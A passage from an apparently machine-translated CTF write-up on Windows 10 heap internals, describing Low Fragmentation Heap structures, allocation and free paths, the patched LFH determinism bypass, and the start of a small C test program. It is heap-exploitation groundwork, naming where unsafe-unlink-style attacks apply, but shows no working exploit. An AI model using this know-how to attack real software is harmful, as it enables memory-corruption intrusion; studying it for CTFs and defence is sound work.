bit of this member is 1 (UnusedBytes OR 0x80 == 1), this chunk is 
recognized as an LFH chunk.</font></font></li>
    </ul>
    <h2 id="33-_heap_list_lookup">3.3. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.vergiliusproject.com/kernels/x64/Windows%252010%2520%257C%25202016/1909%252019H2%2520(November%25202019%2520Update)/_HEAP_LIST_LOOKUP">_HEAP_LIST_LOOKUP</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: Structure used to manage heap chunks in the back-end. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      ( _HEAP-&gt;BlocksIndex )</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExtendedLookup: </font><font style="vertical-align: inherit;">Contains an address pointing to the next </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_LIST_LOOKUP structure.</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ArraySize: Maximum size of heap chunks, must be multiplied by 0x10 to get the original value</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ItemCount: Number of heap chunks being managed</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OutOfRangeItems: Number of heap chunks that exceed the maximum manageable size.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BaseIndex: </font><font style="vertical-align: inherit;">The starting index value of the Heap chunks currently managed by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the _HEAP_LIST_LOOKUP</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure. The range of the index is from the BaseIndex of the current </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_LIST_LOOKUP to the BaseIndex of </font></font></strong><font style="vertical-align: inherit;"><strong><font style="vertical-align: inherit;">_HEAP_LIST_LOOKUP</font></strong><font style="vertical-align: inherit;"> pointed to by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExtendedLookup</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . It is also used when searching for Heap chunks where </font><strong><font style="vertical-align: inherit;">ListHints</font></strong><font style="vertical-align: inherit;"> have been deallocated.</font></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ListHead: Serves as the head of a Double Linked List that manages deallocated Heap chunks, and </font><font style="vertical-align: inherit;">points to </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;FreeLists.</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ListInUseUlong: </font><font style="vertical-align: inherit;">Indicates which of the heap chunks indicated by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ListHints are usable.</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ListHints: Serves as an array of addresses pointing to a Double Linked List of deallocated Heap chunks of the same size.</font></font></li>
    </ul>
    <h2 id="34-_lfh_heap">3.4. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://terminus.rewolf.pl/terminus/structures/ntdll/_LFH_HEAP_x64.html">_LFH_HEAP</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: Structure used to manage LFH chunks. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      ( _HEAP-&gt;FrontEndHeap )</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Heap: </font><font style="vertical-align: inherit;">Indicates the starting address of the </font><strong><font style="vertical-align: inherit;">_HEAP</font></strong><font style="vertical-align: inherit;"> structure that points to the corresponding </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_LFH_HEAP structure.</font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Buckets: Used when finding a memory area that matches the size of the heap chunk that received the allocation request.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SegmentInfoArrays: Used to classify heap chunks by size and manage them as </font><font style="vertical-align: inherit;">different SubSegments ( </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT )</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LocalData: </font><font style="vertical-align: inherit;">Used to find the address of the LFH by reading </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_LOCAL_DATA_x64.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_LOCAL_DATA-&gt;LowFragHeap</font></font></a><font style="vertical-align: inherit;"></font></li>
    </ul>
    <h2 id="35-_heap_bucket">3.5. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_BUCKET_x64.html">_HEAP_BUCKET</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: A structure used for reference when LFH allocates a heap chunk and used to manage the bucket. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      ( _LFH_HEAP-&gt;Buckets )</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BlockUnits:
 Used to find the size of the heap chunk pointed to by the bucket. The 
actual size can be obtained by multiplying by 0x10.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SizeIndex: Has the index value of the relevant Bucket and </font><font style="vertical-align: inherit;">is also used as the index value in the </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_LFH_HEAP-&gt;SegmentInfoArrays array.</font></font></strong><font style="vertical-align: inherit;"></font></li>
    </ul>
    <h2 id="36-_heap_local_segment_info">3.6. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_LOCAL_SEGMENT_INFO_x64.html">_HEAP_LOCAL_SEGMENT_INFO</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: Structure used to manage SubSegment. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      ( _LFH_HEAP-&gt;SegmentInfoArrays )</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LocalData: Points to </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_LFH_HEAP-&gt;LocalData</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . You can </font><font style="vertical-align: inherit;">refer to this to find the starting address of </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_LFH_HEAP .</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ActiveSubsegment: Points to the SubSegment that will be used to process LFH's memory allocation request.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CachedItems: </font><font style="vertical-align: inherit;">If the number of heap chunks that can be managed in the SubSegment pointed to by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ActiveSubsegment is exceeded, a new SubSegment is retrieved from this array.</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BucketIndex: </font><font style="vertical-align: inherit;">Has </font><font style="vertical-align: inherit;">the index value (= </font><strong><font style="vertical-align: inherit;">_HEAP_BUCKET-&gt;SizeIndex ) of </font></strong><strong><font style="vertical-align: inherit;">_LFH_HEAP-&gt;Buckets</font></strong><font style="vertical-align: inherit;"> connected to the SubSegment pointed to by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ActiveSubsegment .</font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></li>
    </ul>
    <h2 id="37-_heap_subsegment">3.7. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_SUBSEGMENT_x64.html">_HEAP_SUBSEGMENT</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: Structure used to manage Heap chunks allocated by LFH by size. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      ( _HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment, _HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems )</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LocalInfo: </font><font style="vertical-align: inherit;">Points to the starting address of </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the _HEAP_LOCAL_SEGMENT_INFO structure pointing to the relevant SubSegment.</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UserBlocks: Indicates the starting address of the UserBlock connected to the relevant SubSegment.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AggregateExchg: Used to refer to the number of deallocated heap chunks remaining in the UserBlock.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BlockSize:
 Stores the size of the heap chunk to be allocated to the UserBlock. The
 actual size can be obtained by multiplying by 0x10.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BlockCount: Stores the number of heap chunks allocated to UserBlock.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SizeIndex: </font><font style="vertical-align: inherit;">Holds the same value as </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_LOCAL_SEGMENT_INFO-&gt;BucketIndex.</font></font></strong><font style="vertical-align: inherit;"></font></li>
    </ul>
    <h2 id="38-_heap_userdata_header">3.8. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_USERDATA_HEADER_x64.html">_HEAP_USERDATA_HEADER</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: A structure located at the beginning of UserBlock that serves as the header of UserBlock. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      ( _HEAP_SUBSEGMENT-&gt;UserBlocks )</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SubSegment: Points to the starting address of the SubSegment connected to the corresponding UserBlock.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EncodedOffsets:
 Used when verifying the integrity of the heap chunk header, and the 
result of the XOR operation as shown below is stored. 
      </font></font><div class="language-plaintext highlighter-rouge">
       <div class="highlight">
        <pre class="highlight"><code>(sizeof(_HEAP_USERDATA_HEADER)+8) | ((_HEAP_BUCKET-&gt;BlockUnits * 0x10) &lt;&lt; 16) ^
pLFHKey ^
&amp;_HEAP_USERBDATA_HEADER ^
&amp;_LFH_HEAP
</code></pre>
       </div>
      </div></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BusyBitmap: </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BusyBitmap-&gt;SizeOfBitMap</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> has </font><font style="vertical-align: inherit;">the same value as </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT-&gt;BlockCount</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , and you can check whether the Heap chunk is allocated in </font><font style="vertical-align: inherit;">the bitmap ( pointing to </font><strong><font style="vertical-align: inherit;">_HEAP_USERDATA_HEADER-&gt;BitmapData ) pointed to by </font></strong></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BusyBitmap-&gt;Buffer.</font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BitmapData:
 Contains 8 bytes of Bitmap data to check whether a Heap chunk has been 
allocated. If the Heap chunk corresponding to a specific index is 
allocated and in use, the bit of that index is 1 ( BUSY ), and if it has
 been deallocated or has never been allocated, it is 0. Marked as ( FREE
 )</font></font></li>
    </ul>
    <h2 id="39-_interlock_seq">3.9. <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://terminus.rewolf.pl/terminus/structures/ntdll/_INTERLOCK_SEQ_x64.html">_INTERLOCK_SEQ</a></h2>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: A structure mainly referred to when calculating the number of allocated or deallocated heap chunks. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      ( _HEAP_SUBSEGMENT-&gt;AggregateExchg )</font></font></p>
    <ul>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Depth: As an initial value, it has the same value as </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT-&gt;BlockCount.</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> When allocating a new Heap chunk, it decreases by 1 and when deallocating, it increases by 1.</font></font></li>
    </ul>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Even though I summarized only the important members of the structures related to LFH, it took quite a bit of time.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If
 you are learning Windows Heap for the first time, it may be a bit 
confusing how each structure is actually used. Therefore, as follows, 
how the Heap memory allocation and deallocation process works by 
distinguishing it from general Heap chunks that are not managed by LFH. I
 summarized it briefly.</font></font></p>
    <h2 id="310-allocate-and-free-non-lfh-chunk">3.10. Allocate and Free Non-LFH chunk</h2>
    <h3 id="allocate">Allocate</h3>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In
 the case of Non-LFH chunks, there are slight differences in memory 
management depending on the size of the Heap chunk for which an 
allocation request has been received.</font></font></p>
    <h4 id="size---_heap-virtualmemorythreshold--0x10-">size &lt;= ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</h4>
    <ol>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If the size of the requested heap chunk is 0x4000 or less, check whether LFH is enabled.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Check </font><font style="vertical-align: inherit;">whether the size of the requested Heap chunk is larger than </font><strong><font style="vertical-align: inherit;">the ArraySize</font></strong><font style="vertical-align: inherit;"> of </font><strong><font style="vertical-align: inherit;">_HEAP_LIST_LOOKUP</font></strong><font style="vertical-align: inherit;"> pointed to by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;BlockIndex</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , and if so , compare it with </font><strong><font style="vertical-align: inherit;">the ArraySize</font></strong><font style="vertical-align: inherit;"> of the structure pointed to by </font><strong><font style="vertical-align: inherit;">_HEAP_LIST_LOOKUP-&gt;ExtendedLookup to find a valid structure.</font></strong></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Searches </font><strong><font style="vertical-align: inherit;">_HEAP_LIST_LOOKUP-&gt;ListHint to find and returns a Heap memory area of ​​appropriate size.</font></strong></font></li>
    </ol>
    <h4 id="size---_heap-virtualmemorythreshold--0x10--1">size &gt; ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</h4>
    <ol>
     <li><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://docs.microsoft.com/en-us/previous-versions/ff566416(v%253Dvs.85)"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Memory is allocated using </font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://docs.microsoft.com/en-us/previous-versions/ff566416(v%253Dvs.85)"><font style="vertical-align: inherit;">the ZwAllocateVirtualMemory()</font></a><font style="vertical-align: inherit;"> function and inserted into </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;VirtualAllocdBlocks . </font></font></strong><font style="vertical-align: inherit;"></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
       (Heap chunks allocated in the same manner as above use the </font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.vergiliusproject.com/kernels/x64/Windows%252010%2520%257C%25202016/1909%252019H2%2520(November%25202019%2520Update)/_HEAP_VIRTUAL_ALLOC_ENTRY"><font style="vertical-align: inherit;">_HEAP_VIRTUAL_ALLOC_ENTRY</font></a><font style="vertical-align: inherit;"> structure as the header </font><font style="vertical-align: inherit;">instead of </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_ENTRY )</font></font></strong><font style="vertical-align: inherit;"></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.vergiliusproject.com/kernels/x64/Windows%252010%2520%257C%25202016/1909%252019H2%2520(November%25202019%2520Update)/_HEAP_VIRTUAL_ALLOC_ENTRY"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font></li>
    </ol>
    <h3 id="free">Free</h3>
    <h4 id="size---_heap-virtualmemorythreshold--0x10--2"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">size &lt;= ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</font></font></h4>
    <ol>
     <li><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Check whether it is a Heap chunk managed by LFH with </font><strong><font style="vertical-align: inherit;">_HEAP_ENTRY-&gt;UnusedBytes .</font></strong></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If
 the previously or later allocated heap chunk has been deallocated, it 
is combined with the chunk to be deallocated and the combined size is 
updated.</font></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If the combined Heap chunk </font><font style="vertical-align: inherit;">can be inserted at the beginning or end of </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;FreeLists,</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> it is inserted. If not, it is inserted at </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_LIST_LOOKUP-&gt;ListHints . </font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( A form of attack very similar to the </font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c"><font style="vertical-align: inherit;">Unsafe Unlink</font></a></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> technique 
       that occurs in glibc is possible)</font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font></li>
    </ol>
    <h4 id="size---_heap-virtualmemorythreshold--0x10--3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">size &gt; ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</font></font></h4>
    <ol>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After checking the integrity of the heap header, </font><font style="vertical-align: inherit;">remove the corresponding heap chunk address from </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;VirtualAllocdBlocks</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and deallocate it with </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the ntdll!RtlpSecMemFreeVirtualMemory function.</font></font></strong><font style="vertical-align: inherit;"></font></li>
    </ol>
    <h2 id="311-allocate-and-free-lfh-chunk">3.11. Allocate and Free LFH chunk</h2>
    <h3 id="allocate-1">Allocate</h3>
    <ol>
     <li><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Search </font><strong><font style="vertical-align: inherit;">_LFH_HEAP-&gt;Buckets</font></strong><font style="vertical-align: inherit;"> to find </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the SizeIndex of the Buckets that matches the size you want to allocate, and use it as the index of </font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the _LFH_HEAP-&gt;SegmentInfoArrays</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> array to find the appropriate SubSegment.</font></font></li>
     <li><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Read the Depth</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> of the SubSegment pointed to by </font><strong><font style="vertical-align: inherit;">_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</font></strong><font style="vertical-align: inherit;"> to check whether there is a Heap chunk that can be allocated. If not, </font><font style="vertical-align: inherit;">a new SubSegment is retrieved from </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems .</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Decrease </font><strong><font style="vertical-align: inherit;">_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment-&gt;AggregateExchg-&gt;Depth by 1.</font></strong></font></li>
     <li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ntdll!RtlpLowFragHeapRandomData</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> reads 1 byte of random numbers at random positions and uses them as the index value of the heap chunk.</font></font></li>
     <li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_USERDATA_HEADER-&gt;</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Check whether a Heap chunk can be allocated to the corresponding index 
of the Bitmap pointed to by BusyBitmap. If possible, allocate it and 
return the address. Otherwise, search another adjacent index.</font></font></li>
    </ol>
    <h3 id="free-1">Free</h3>
    <ol>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Decode the header </font><font style="vertical-align: inherit;">to find the addresses of </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_USERDATA_HEADER</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT .</font></font></strong><font style="vertical-align: inherit;"></font></li>
     <li><strong><font style="vertical-align: inherit;"></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Modify the value of </font><strong><font style="vertical-align: inherit;">_HEAP_ENTRY-&gt;UnusedBytes to 0x80.</font></strong></font></li>
     <li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In the bitmap, the bit with the same index as the heap chunk to be deallocated is modified to 0, and </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT-&gt;AggregateExchg-&gt;Depth</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is increased by 1.</font></font></li>
    </ol>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When
 LFH is activated, the most noticeable difference from a security 
perspective is that the location between heap chunks is 
Non-Deterministic, simply put, I do not know where the heap chunk that I
 sent the allocation request to will be located.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Most
 of the Heap exploit techniques in glibc that we are familiar with can 
determine the size and gap between Heap chunks of the same size, so the 
header of the Heap chunk located behind or (if the Heap chunk behind is 
deallocated) FD and This is done in the form of manipulating BK or top 
chunk.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If
 LFH is a disabled heap chunk, you can use this technique as mentioned 
above, but LFH has some difficulties because it is not possible to know 
where heap chunks allocated of the same size are located.</font></font></p>
    <p><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://twitter.com/AmarSaar"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Before </font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://twitter.com/AmarSaar"><font style="vertical-align: inherit;">Saar Amar, when reading a random index from </font></a></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ntdll!RtlpLowFragHeapRandomData</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to allocate a heap chunk , the data remains fixed once set, and the order of reading data is sequential, so that </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/saaramar/Deterministic_LFH"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LFH's Non-Deterministic We have found </font><font style="vertical-align: inherit;">a vulnerability that can bypass the feature</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 , but since this vulnerability has been patched since Windows 10 
Version 16179, the vulnerability does not occur as shown below.</font></font></p>
    <p><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/lazyfragmentationheap-pic8.png" alt="vuln mitigated"></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">You can check this with a simple test code.</font></font></p>
    <div class="language-c highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
</span>
<span class="cp">#define SIZE 0x80
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">LPVOID</span> <span class="o">*</span><span class="n">ptr_arr</span><span class="p">[</span><span class="mh">0x112</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hHeap</span><span class="p">;</span>

	<span class="n">hHeap</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="c1">// activate LFH</span>
	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x12</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] create BP print hook NOW</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>

	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mh">0x12</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x112</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] All allocated heap chunks are going to be de-allocated"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>

	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x112</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
